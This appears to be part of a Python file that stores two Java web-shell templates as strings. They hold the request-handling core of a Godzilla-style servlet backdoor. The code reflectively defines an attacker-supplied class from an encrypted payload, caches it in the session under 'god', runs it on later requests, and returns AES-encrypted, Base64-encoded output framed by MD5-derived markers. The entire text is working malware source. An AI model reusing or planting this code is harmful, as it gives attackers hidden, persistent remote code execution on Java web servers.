code = """
    public String b64encode(byte[] result) {
        Class base64;
        String str = null;
        try {
            base64 = Class.forName("java.util.Base64");
            str = (String) invokeMethod(
                getMethod(base64, "getEncoder").invoke(base64),
                "encodeToString", result
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                str = (String) invokeMethod(
                    base64.newInstance(), "encode", result
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return str;
    }

    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        byte b[] = decoder(payload);
        if (lock instanceof Class) {
            java.io.ByteArrayOutputStream arrOut =
                new java.io.ByteArrayOutputStream();
            Object f = invokeMethod(lock, "newInstance");
            f.equals(arrOut);
            f.equals(request);
            f.equals(b);
            f.toString();
            String fix = hasher(
                password + hasher(password, "MD5").substring(0, 16), "MD5"
            );
            String result = fix.substring(0, 16).toUpperCase()+
                b64encode(cipher(arrOut.toByteArray(), "AES",
                    hasher(password, "MD5").substring(0, 16).getBytes(), true)
                )+
                fix.substring(16).toUpperCase();
            try {
                invokeMethod(
                    invokeMethod(response, "getWriter"), "write", result
                );
            } catch (Exception e) {}
            return result;
        } else {
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            lock = defineMethod.invoke(classloader, b, 0, b.length);
        }
        return null;
    }
"""

proc = """
            Object god = ((HttpServletRequest) req).getSession()
                .getAttribute("god");
            if (god instanceof Class) {
                java.io.ByteArrayOutputStream arrOut =
                    new java.io.ByteArrayOutputStream();
                Object f = ((Class) god).newInstance();
                f.equals(arrOut);
                f.equals(req);
                f.equals(bytes);
                f.toString();
                h.update(password.getBytes(), 0, password.length());
                String h1 = new BigInteger(1, h.digest()).toString(16);
                String h2 = password + h1.substring(0, 16);
                h.update(h2.getBytes(), 0, h2.length());
                String fix = new BigInteger(1, h.digest()).toString(16);
                c.init(1, new javax.crypto.spec.SecretKeySpec(key, "AES"));
                bytes = c.doFinal(arrOut.toByteArray());

                String str = null;
                try {
                    base64 = Class.forName("java.util.Base64");
                    Object encoder = base64.getMethod("getEncoder")
                        .invoke(base64);
                    str = (String) encoder.getClass()
                        .getMethod("encodeToString", byte[].class)
                        .invoke(encoder, bytes);
                } catch (ClassNotFoundException e) {
                    try {
                        base64 = Class.forName("sun.misc.BASE64Decoder");
                        Object encoder = base64.newInstance();
                        str = (String) encoder.getClass().getMethod("encode", byte[].class)
                            .invoke(encoder, bytes);
                    } catch (Exception ex) {}
                } catch (Exception ex) {}

                String result = fix.substring(0, 16).toUpperCase()+
                    str+fix.substring(16).toUpperCase();
                res.getWriter().write(result);
            } else {
                Constructor constructor = java.security.SecureClassLoader.class
                    .getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                ClassLoader classloader = (ClassLoader) constructor.newInstance(
                    new Object[]{this.getClass().getClassLoader()}
                );
                Method defineMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, int.class, int.class
                );
                defineMethod.setAccessible(true);
                ((HttpServletRequest) req).getSession().setAttribute(
                    "god", defineMethod.invoke(
                        classloader, bytes, 0, bytes.length
                    )
                );
            }
"""